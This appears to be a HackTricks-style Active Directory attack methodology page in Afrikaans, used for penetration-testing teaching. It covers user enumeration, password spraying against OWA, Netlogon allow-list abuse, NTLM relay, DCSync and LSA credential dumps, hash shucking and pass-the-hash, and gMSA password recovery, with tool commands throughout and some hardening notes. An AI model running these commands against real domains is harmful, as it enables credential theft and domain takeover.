# Active Directory-metodologie

{{#include ../../banners/hacktricks-training.md}}

## Basiese oorsig

**Active Directory** dien as ’n grondliggende tegnologie wat **netwerkadministrateurs** in staat stel om **domeine**, **gebruikers** en **objekte** binne ’n netwerk doeltreffend te skep en te bestuur. Dit is ontwerp om te skaal en maak dit moontlik om ’n groot aantal gebruikers in hanteerbare **groepe** en **subgroepe** te organiseer, terwyl **toegangsregte** op verskillende vlakke beheer word.

Die struktuur van **Active Directory** bestaan uit drie primêre lae: **domeine**, **bome** en **woude**. ’n **Domein** omvat ’n versameling objekte, soos **gebruikers** of **toestelle**, wat ’n gemeenskaplike databasis deel. **Bome** is groepe van hierdie domeine wat deur ’n gedeelde struktuur gekoppel is, en ’n **woud** verteenwoordig ’n versameling van verskeie bome wat deur **vertrouensverhoudings** met mekaar verbind is. Dit vorm die boonste laag van die organisasiestruktuur. Spesifieke **toegangs-** en **kommunikasieregte** kan op elkeen van hierdie vlakke toegeken word.

Sleutelkonsepte binne **Active Directory** sluit in:

1. **Gids** – Bevat alle inligting oor Active Directory-objekte.
2. **Objek** – Dui entiteite in die gids aan, insluitend **gebruikers**, **groepe** of **gedeelde vouers**.
3. **Domein** – Dien as ’n houer vir gidsobjekte. Verskeie domeine kan binne ’n **woud** bestaan, elk met sy eie versameling objekte.
4. **Boom** – ’n Groepering van domeine wat ’n gemeenskaplike worteldomein deel.
5. **Woud** – Die hoogste vlak van die organisasiestruktuur in Active Directory, bestaande uit verskeie bome met **vertrouensverhoudings** tussen hulle.

**Active Directory Domain Services (AD DS)** omvat ’n reeks dienste wat noodsaaklik is vir gesentraliseerde bestuur en kommunikasie binne ’n netwerk. Hierdie dienste sluit in:

1. **Domeindienste** – Sentraliseer databerging en bestuur interaksies tussen **gebruikers** en **domeine**, insluitend **stawing** en **soekfunksies**.
2. **Sertifikaatdienste** – Hou toesig oor die skepping, verspreiding en bestuur van veilige **digitale sertifikate**.
3. **Liggewig-gidsdienste** – Ondersteun gidsgeaktiveerde toepassings deur die **LDAP-protokol**.
4. **Gidsfederasiedienste** – Bied **enkel-aanmelding** om gebruikers oor verskeie webtoepassings in ’n enkele sessie te staaf.
5. **Regtebestuur** – Help om materiaal waarop kopiereg rus te beskerm deur die ongemagtigde verspreiding en gebruik daarvan te reguleer.
6. **DNS-diens** – Noodsaaklik vir die oplossing van **domeinname**.

Vir ’n meer gedetailleerde verduideliking, kyk na: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos-stawing**

Om te leer hoe om ’n **AD aan te val**, moet jy die **Kerberos-stawingsproses** baie goed **verstaan**.\
[**Lees hierdie bladsy as jy nog nie weet hoe dit werk nie.**](kerberos-authentication.md)

## Cheat Sheet

Jy kan na [https://wadcoms.github.io/](https://wadcoms.github.io) gaan vir ’n vinnige oorsig van watter opdragte jy kan uitvoer om ’n AD te enumereer/uit te buit.

> [!WARNING]
> Kerberos-kommunikasie **vereis gewoonlik ’n volledig gekwalifiseerde domeinnaam (FQDN)** sodat die kliënt ’n kaartjie vir die korrekte SPN kan verkry. Toegang tot ’n masjien via sy IP-adres val gewoonlik terug na NTLM in plaas van Kerberos.

## Verkenning van Active Directory (Geen creds/sessies)

As jy net toegang tot ’n AD-omgewing het, maar geen creds/sessies het nie, kan jy:

- **Die netwerk pentest:**
  - Skandeer die netwerk, vind masjiene en oop poorte, en probeer **kwesbaarhede uitbuit** of **creds onttrek** (byvoorbeeld, [drukkers kan baie interessante teikens wees](ad-information-in-printers.md)).
  - DNS-enumerasie kan inligting oplewer oor belangrike bedieners in die domein, soos webwerwe, drukkers, shares, VPN, media, ens.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Kyk na die algemene [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) vir meer inligting oor hoe om dit te doen.
- **Kyk vir null- en Guest-toegang op SMB-dienste** (dit sal nie op moderne Windows-weergawes werk nie):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - ’n Meer gedetailleerde gids oor hoe om ’n SMB-bediener te enumereer, kan hier gevind word:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumereer LDAP**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - ’n Meer gedetailleerde gids oor hoe om LDAP te enumereer, kan hier gevind word (let **veral op anonieme toegang**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Vergiftig die netwerk**
  - Versamel creds deur [**dienste met Responder na te boots**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Kry toegang tot ’n gasheer deur [**die relay attack uit te buit**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Versamel creds deur [**vals UPnP-dienste met evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) bloot te stel
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Onttrek gebruikersname/name uit interne dokumente, sosiale media, dienste (hoofsaaklik web) binne die domeinomgewings en ook uit inligting wat publiek beskikbaar is.
  - As jy die volledige name van maatskappywerknemers vind, kan jy verskillende AD-**gebruikersnaamkonvensies** probeer (**[lees dit](https://activedirectorypro.com/active-directory-user-naming-convention/)**). Die algemeenste konvensies is: _NameSurname_, _Name.Surname_, _NamSur_ (3 letters van elk), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _ewekansige letters en 3 ewekansige syfers_ (abc123).
  - Gereedskap:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Gebruikersenumerasie

- **Anonieme SMB/LDAP-enumerasie:** Kyk na die [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html)- en [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md)-bladsye.
- **Kerbrute-enum:** Wanneer ’n **ongeldige gebruikersnaam aangevra word**, sal die bediener reageer met die **Kerberos-foutkode** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, wat ons in staat stel om vas te stel dat die gebruikersnaam ongeldig was. **Geldige gebruikersname** sal óf die **TGT in ’n AS-REP**-reaksie oplewer óf die fout _KRB5KDC_ERR_PREAUTH_REQUIRED_, wat aandui dat die gebruiker voorafstawing moet uitvoer.
- **Geen stawing teen MS-NRPC nie**: Gebruik auth-level = 1 (geen stawing) teen die MS-NRPC (Netlogon)-koppelvlak op domeinbeheerders. Die metode roep die `DsrGetDcNameEx2`-funksie aan nadat dit aan die MS-NRPC-koppelvlak gebind het, om te kyk of die gebruiker of rekenaar bestaan sonder enige creds. Die [NauthNRPC](https://github.com/sud0Ru/NauthNRPC)-instrument implementeer hierdie tipe enumerasie. Die navorsing kan [hier](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup> gevind word.

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **OWA (Outlook Web Access)-bediener**

As jy een van hierdie bedieners op die netwerk gevind het, kan jy ook **gebruikersenumerasie daarteen uitvoer**. Jy kan byvoorbeeld die nutsding [**MailSniper**](https://github.com/dafthack/MailSniper) gebruik:

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Jy kan lyste met gebruikersname in [**hierdie github-repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) en hierdie een ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)) vind.
>
> Jy behoort egter die **name te hê van die mense wat by die maatskappy werk**, uit die recon-stap wat jy vooraf moes uitgevoer het. Met die voornaam en van kon jy die script [**namemash.py**](https://gist.github.com/superkojiman/11076951) gebruik om moontlike geldige gebruikersname te genereer.

### Netlogon vulnerable-channel allow-list abuse (Onelogon)

Selfs nadat **Zerologon** op die DC reggemaak is, kan rekeninge wat uitdruklik op die allow-list geplaas is steeds blootgestel wees aan **legacy/vulnerable Netlogon secure-channel-gedrag**. Die riskante konfigurasie is die GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** of die ooreenstemmende registerwaarde **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Daardie waarde is ’n **SDDL-sekuriteitsbeskrywer** (sien [Security Descriptors](security-descriptors.md)). Enige rekening of groep waaraan die toepaslike ACE in die DACL toegeken is, kan geteiken word. Byvoorbeeld, `O:BAG:BAD:(A;;RC;;;WD)` plaas effektief **Everyone** op die allow-list.

Praktiese operator-werkvloei:

1. **Identifiseer principals op die allow-list** deur beide **SYSVOL/GPO** en die **aktiewe DC-register** na te gaan.
2. **Los SIDs** wat in die SDDL gevind word op na werklike AD-gebruikers/rekenaars en gee voorkeur aan **DC-masjienrekeninge**, **trust-rekeninge** en ander bevoorregte masjiene.
3. Probeer herhaaldelik **MS-NRPC / Netlogon-verifikasie** as die rekening op die allow-list.
4. Ná ’n suksesvolle raaiskoot, misbruik **Netlogon-wagwoordinstelling** om die teikenrekening se wagwoord terug te stel (die openbare PoC stel dit op ’n leë string).<sup>[[9]](#references)[[10]](#references)</sup>

Vinnige triage-/labvoorbeelde uit die openbare artefak:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Notas:

- Die **scanner** is nuttig omdat die effektiewe toelaatlys in **SYSVOL**, die **register** of albei kan wees.
- Die exploit-pad self is belangrik omdat dit **nie Domain Admin-regte vereis nie** sodra ’n kwesbare rekening geïdentifiseer is.
- Die kompromittering van ’n **Domain Controller-masjienrekening**, soos `DC$`, is besonder gevaarlik omdat die terugstelling van daardie wagwoord breër **AD-oornameroetes** direk moontlik kan maak.
- Die uitvoerbaarheid van **brute force** hang van die modus af: die openbare artefak beskryf ’n meet-in-the-middle-benadering, ’n **24-bit** brute force wanneer nog ’n rekenaarrekening beskikbaar is, en stadiger **32-bit**-variante.

Notas oor opsporing/verharding:

- Gaan die toelaatlysbeleid na en verwyder alles behalwe tydelike, uitdruklik vereiste versoenbaarheidsuitsonderings.
- Monitor DC **System**-gebeurtenisse **5827/5828/5829/5830/5831** om te sien wanneer kwesbare Netlogon-verbindings geweier, opgespoor of uitdruklik deur beleid toegelaat word.
- Behandel rekeninge in `VulnerableChannelAllowList` as **hoë risiko** totdat die afhanklikheid van die ou stelsel verwyder is.

### Kenning van een of meer gebruikersname

Goed, jy weet dus reeds dat jy ’n geldige gebruikersnaam het, maar geen wagwoorde nie... Probeer dan:

- [**ASREPRoast**](asreproast.md): As ’n gebruiker **nie** die kenmerk _DONT_REQ_PREAUTH_ het nie, kan jy ’n **AS_REP-boodskap vir daardie gebruiker aanvra**. Dit sal data bevat wat met ’n afleiding van die gebruiker se wagwoord geënkripteer is.
- [**Password Spraying**](password-spraying.md): Kom ons probeer die **mees algemene wagwoorde** met elkeen van die ontdekte gebruikers; dalk gebruik een of ander gebruiker ’n swak wagwoord (hou die wagwoordbeleid in gedagte!).
  - Let daarop dat jy ook **OWA-bedieners kan spray** om toegang tot die gebruikers se posbedieners te probeer verkry.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Jy kan dalk ’n paar challenge-**hashes** **verkry** deur sekere **netwerk**-protokolle te **poison**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

Active Directory-enumerasie verskaf gebruikersname, e-posidentifiseerders en naamgewingspatrone, moontlike teiken-gashere, en dienste wat gedwing kan word om te autentiseer. Gebruik dié konteks om uitvoerbare NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) en moontlike roetes na die AD-omgewing te identifiseer.

### NetExec-verkenning en kontroles van relay-posisie met behulp van workspaces

- Gebruik **`nxcdb` workspaces** om AD-verkenningstoestand per opdrag te behou: `workspace create <name>` skep SQLite-databasisse per protokol onder `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Wissel aansigte met `proto smb|mssql|winrm` en lys versamelde geheime met `creds`. Verwyder sensitiewe data handmatig wanneer jy klaar is: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- Vinnige subnet-ontdekking met **`netexec smb <cidr>`** wys **domein**, **OS-bouweergawe**, **SMB-ondertekeningvereistes** en **Null Auth**. Lede wat `(signing:False)` wys, is **kwesbaar vir relay**, terwyl DC’s dikwels ondertekening vereis.
- Genereer **gasheername in /etc/hosts** direk vanaf NetExec-uitvoer om teikenstelling te vergemaklik:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Wanneer **SMB relay to the DC** deur signing geblokkeer word, toets steeds die **LDAP**-houding: `netexec ldap <dc>` wys `(signing:None)` / swak channel binding uit. ’n DC met SMB signing required maar LDAP signing disabled bly ’n geskikte **relay-to-LDAP**-teiken vir misbruik soos **SPN-less RBCD**.

### Kliëntkantdrukker-credential leaks → massavalidering van domeincredentials

- Drukker-/web-UI’s **sluit soms gemaskerde admin-wagwoorde in HTML in**. Deur die bronkode/devtools te bekyk, kan die wagwoord in gewone teks verskyn (bv. `<input value="<password>">`), wat Basic-auth-toegang tot skandeer-/drukbewaarplekke moontlik maak.
- Herwonne drukwerk kan **plaintext onboarding-dokumente** met wagwoorde per gebruiker bevat. Hou die pare in lyn wanneer jy toets:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Steel NTLM-bewyse

As jy **toegang tot ander rekenaars of shares** met die **null- of guest-gebruiker** het, kan jy **lêers plaas** (soos ’n SCF-lêer) wat, indien dit op een of ander manier oopgemaak word, **’n NTLM-verifikasie teen jou sal aktiveer**, sodat jy die **NTLM challenge** kan **steel** om dit te crack:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** behandel elke NT-hash wat jy reeds besit as ’n kandidaatwagwoord vir ander, stadiger formate waarvan die sleutelmateriaal direk van die NT-hash afgelei word. In plaas daarvan om lang wagfrases in Kerberos RC4-tickets, NetNTLM-challenges of kasbewyse met brute force te probeer kraak, voer jy die NT-hashes in Hashcat se NT-candidate-modusse in en laat jy dit wagwoordhergebruik bevestig sonder dat jy ooit die gewone teks hoef te ontdek. Dit is veral kragtig ná ’n domeinkompromittering, wanneer jy duisende huidige en historiese NT-hashes kan versamel.<sup>[[5]](#references)</sup>

Gebruik shucking wanneer:

- Jy ’n NT-korpus van DCSync, SAM/SECURITY-dumps of geloofskluisies het en hergebruik in ander domeine/woude wil toets.
- Jy RC4-gebaseerde Kerberos-materiaal (`$krb5tgs$23$`, `$krb5asrep$23$`), NetNTLM-antwoorde of DCC/DCC2-blobs vasvang.
- Jy hergebruik van lang, onkraakbare wagfrases vinnig wil bevestig en onmiddellik via Pass-the-Hash wil pivot.

Die tegniek **werk nie** teen enkripsietipes waarvan die sleutels nie die NT-hash is nie (bv. Kerberos etype 17/18 AES). As ’n domein slegs AES afdwing, moet jy na die gewone wagwoordmodusse terugkeer.

#### Bou ’n NT-hash-korpus

- **DCSync/NTDS** – Gebruik `secretsdump.py` met geskiedenis om die grootste moontlike stel NT-hashes (en hul vorige waardes) te versamel:

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Geskiedenisinskrywings vergroot die kandidaatpoel aansienlik omdat Microsoft tot 24 vorige hashes per rekening kan stoor. Vir meer maniere om NTDS-secrets te versamel, sien:

{{#ref}}
dcsync.md
{{#endref}}

- **Eindpuntkasstortings** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (of Mimikatz `lsadump::sam /patch`) onttrek plaaslike SAM/SECURITY-data en kasdomeinaanmeldings (DCC/DCC2). Verwyder duplikate en voeg daardie hashes by dieselfde `nt_candidates.txt`-lys.
- **Volg metadata** – Hou die gebruikersnaam/domein by wat elke hash opgelewer het (selfs al bevat die woordelys slegs hex). Wanneer Hashcat die wenkandidaat wys, vertel ooreenstemmende hashes jou onmiddellik watter sekuriteitsidentiteit ’n wagwoord hergebruik.
- Verkies kandidate uit dieselfde forest of ’n vertroude forest; dit maksimeer die kans op oorvleueling tydens shucking.

#### Hashcat NT-kandidaatmodusse

| Hash Type                                | Password Mode | NT-Candidate Mode |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

Notas:

- NT-kandidaatinsette **moet rou NT-hashes van 32 hex-karakters bly**. Deaktiveer reël-enjins (geen `-r` of hibriedmodusse nie), want mangling korrupteer die kandidaatsleutelmateriaal.
- Hierdie modusse is nie inherent vinniger nie, maar die NTLM-sleutelruimte (~30 000 MH/s op ’n M3 Max) is ~100× vinniger as Kerberos RC4 (~300 MH/s). Om ’n saamgestelde NT-lys te toets, kos baie minder as om die volledige wagwoordruimte in die stadiger formaat te verken.
- Gebruik altyd die **nuutste Hashcat-bou** (`git clone https://github.com/hashcat/hashcat && make install`), want modusse 31500/31600/35300/35400 is onlangs vrygestel.<sup>[[7]](#references)</sup>
- Daar is tans geen NT-modus vir AS-REQ Pre-Auth nie, en AES-etipes (19600/19700) vereis die gewone tekswagwoord omdat hul sleutels via PBKDF2 uit UTF-16LE-wagwoorde afgelei word, nie uit rou NT-hashes nie.

#### Voorbeeld – Kerberoast RC4 (modus 35300)

1. Vang ’n RC4 TGS vir ’n teiken-SPN vas met ’n gebruiker met lae voorregte (sien die Kerberoast-bladsy vir besonderhede):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Shuck die ticket met jou NT-lys:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat lei die RC4-sleutel van elke NT-kandidaat af en valideer die `$krb5tgs$23$...`-blob. ’n Pas bevestig dat die diensrekening een van jou bestaande NT-hashes gebruik.

3. Skakel onmiddellik oor na PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Jy kan die plaintext later opsioneel met `hashcat -m 1000 <matched_hash> wordlists/` herwin indien nodig.

#### Voorbeeld – Cached credentials (mode 31600)

1. Dump cached logons vanaf ’n gekompromitteerde werkstasie:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Kopieer die DCC2-reël vir die interessante domeingebruiker na `dcc2_highpriv.txt` en shuck dit:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. ’n Suksesvolle passing lewer die NT-hash op wat reeds in jou lys bekend is, en bewys dat die gekasde gebruiker ’n wagwoord hergebruik. Gebruik dit direk vir PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) of brute-force dit in vinnige NTLM-modus om die wagwoordstring te herwin.

Dieselfde werkvloei geld vir NetNTLM-uitdaag-antwoorde (`-m 27000/27100`) en DCC (`-m 31500`). Sodra ’n passing geïdentifiseer is, kan jy relay, SMB/WMI/WinRM PtH begin, of die NT-hash weer vanlyn met maskers/reëls kraak.



## Active Directory enumerasie MET credentials/session

Vir hierdie fase moet jy **die credentials of ’n sessie van ’n geldige domeinrekening gekompromitteer het.** As jy geldige credentials of ’n shell as ’n domeingebruiker het, **moet jy onthou dat die opsies wat vroeër gegee is steeds opsies is om ander gebruikers te kompromitteer**.

Voordat jy met geverifieerde enumerasie begin, moet jy die **Kerberos double-hop-probleem** verstaan.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumerasie

Om ’n rekening te kompromitteer is ’n **groot stap in die beoordeling van die domein**, omdat dit geverifieerde **Active Directory-enumerasie** moontlik maak:

Wat [**ASREPRoast**](asreproast.md) betref, kan jy nou elke moontlike kwesbare gebruiker vind. Wat [**Password Spraying**](password-spraying.md) betref, kan jy ’n **lys van al die gebruikersname** kry en die wagwoord van die gekompromitteerde rekening, leë wagwoorde en nuwe belowende wagwoorde probeer.

- Jy kan die [**CMD gebruik om basiese verkenning uit te voer**](../basic-cmd-for-pentesters.md#domain-info)
- Jy kan ook [**powershell vir verkenning gebruik**](../basic-powershell-for-pentesters/index.html), wat minder opsigtelik sal wees
- Jy kan ook [**powerview gebruik**](../basic-powershell-for-pentesters/powerview.md) om meer gedetailleerde inligting te onttrek
- Nog ’n uitstekende hulpmiddel vir verkenning in ’n active directory is [**BloodHound**](bloodhound.md). Dit is **nie baie opsigtelik nie** (afhangend van die versamelingsmetodes wat jy gebruik), maar **as jy nie daaroor omgee nie**, moet jy dit beslis probeer. Vind waar gebruikers RDP kan gebruik, vind paaie na ander groepe, ens.
  - **Ander outomatiese AD-enumerasiehulpmiddels is:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**DNS-rekords van die AD**](ad-dns-records.md), aangesien hulle interessante inligting kan bevat.
- ’n **hulpmiddel met GUI** wat jy kan gebruik om die directory te enumereer, is **AdExplorer.exe** van die **SysInternal** Suite.
- Jy kan ook met **ldapsearch** in die LDAP-databasis soek na credentials in die velde _userPassword_ en _unixUserPassword_, of selfs in gebruiker- _description_- en _info_-notas. ’n Ongemerkte, wagwoordagtige tekenreeks in _info_ is slegs ’n moontlike kandidaat: bevestig die doel en geldigheid daarvan afsonderlik, en hou die inhoud van notas uit roetine-enumerasie-uitvoer. Sien [Wagwoord in AD User-kommentaar op PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) vir ander metodes.
- Gaan **toeganklike** domeinaanteken- en skyfkarteringskripte na onder `\\<dc>\NETLOGON` of `\\<dc>\SYSVOL\<domain>\scripts` wanneer magtiging dit toelaat. [Microsoft se dokumentasie](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) beskryf die NETLOGON-share se rol as ’n skripgids. Lys eers die name en ondersoek dan slegs relevante, leesbare skripte binne ’n groottelimiet; moenie ’n hele share aflaai of credential-waardes tydens roetine-enumerasie vertoon nie. ’n PowerShell-aanroep na [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **beskerm nie** ’n letterlike wagwoord wat in die skrip gestoor is nie. Die aanroep alleen bewys nie dat ’n geheim hardcoded is nie: volg die werklike invoer daarvan en verifieer dan afsonderlik die rekening, credential se geldigheid en voorregte. ’n Domeinskrip is ’n hersiening van ’n afgeleë share, afsonderlik van plaaslike gasheerenumerasie.
- As jy **Linux** gebruik, kan jy die domein ook met [**pywerview**](https://github.com/the-useless-one/pywerview) enumereer.
- Jy kan ook outomatiese hulpmiddels probeer, soos:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Onttrekking van alle domeingebruikers**

  Dit is baie maklik om al die domeingebruikersname van Windows af te kry (`net user /domain` ,`Get-DomainUser` of `wmic useraccount get name,sid`). In Linux kan jy die volgende gebruik: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` of `enum4linux -a -u "user" -p "password" <DC IP>`

> Selfs al lyk hierdie Enumerasie-afdeling klein, is dit die belangrikste deel van alles. Gaan na die skakels (hoofsaaklik dié oor cmd, powershell, powerview en BloodHound), leer hoe om ’n domein te enumereer en oefen totdat jy gemaklik daarmee voel. Tydens ’n assessering is dit die deurslaggewende oomblik om jou pad na DA te vind of te besluit dat niks gedoen kan word nie.

### Voorspelbare voorafgeskepte rekenaarrekeninge -> gMSA-wagwoordtoegang

Rekenaarrekeninge wat vir verouderde aansluitings vooraf opgestel is, kan ’n voorspelbare aanvanklike wagwoord behou. NetExec se `pre2k`-module identifiseer die kenmerkende `userAccountControl`-waarde `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) en probeer ’n Kerberos TGT met die eerste 14 karakters van die rekenaarnaam in kleinletters, sonder die laaste `$`. Beskou hierdie UAC-waarde as ’n manier om kandidate te kies, eerder as om aan te neem dat lidmaatskap van **Pre-Windows 2000 Compatible Access** alleen bewys dat die wagwoord swak is.<sup>[[18]](#references)[[20]](#references)</sup>

Gebruik geverifieerde LDAP-enumerasie om die kandidate te toets en suksesvolle TGT’s te stoor. `ALL=True` brei toetsing uit na voorwerpe buite dié met die verstekfilter `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

'n Mislukte verstek-/NTLM-bind maak nie hierdie bevinding ongeldig nie: toets met `-k`, 'n FQDN wat na die DC resolveer, en 'n klok wat met die KDC gesinchroniseer is. Suksesvolle module-runs skryf kandidaatlyste en verkrygde ccaches onder `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Nadat jy die computer principal gekompromitteer het, karteer sy geneste groeplidmaatskappe en uitgaande regte. Veral principals wat in 'n gMSA se `msDS-GroupMSAMembership`-sekuriteitsbeskrywer genoem word, kan `msDS-ManagedPassword` lees; NetExec se `--gmsa`-afvoer wys die toegelate principals en gee die huidige NT-hash terug wanneer die computer wat verifieer, gemagtig is.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Evalueer dan die herwonne gMSA soos enige ander credential: ondersoek plaaslike/domeingroeplidmaatskap, aanmeldregte, SPN's, delegering en bereikbare dienste voordat jy pass-the-hash probeer. Hierdie ACL-gebaseerde herwinningspad verskil van [Golden gMSA/dMSA](golden-dmsa-gmsa.md), wat bestuurde wagwoorde aflei nadat die KDS-wortelsleutel gekompromitteer is.<sup>[[20]](#references)</sup>

'n Rekenaar-prinsipaal kan ook uitgaande beheer oor ander rekenaarobjekte of groepe hê. Nadat jy een verkry het, ondersoek sy geneste lidmaatskappe en effektiewe ACL's afsonderlik: 'n skryfreg op 'n ander rekenaarobjek kan 'n rekeningverandering moontlik maak, en regte om groeplidmaatskap te verander, kan tot 'n aanmeldrol lei. 'n Vlag vir 'n opgevoerde rekening, 'n voorspelbare naamkonvensie of 'n `GenericWrite`-skakel bewys op sigself nie die volledige pad nie.

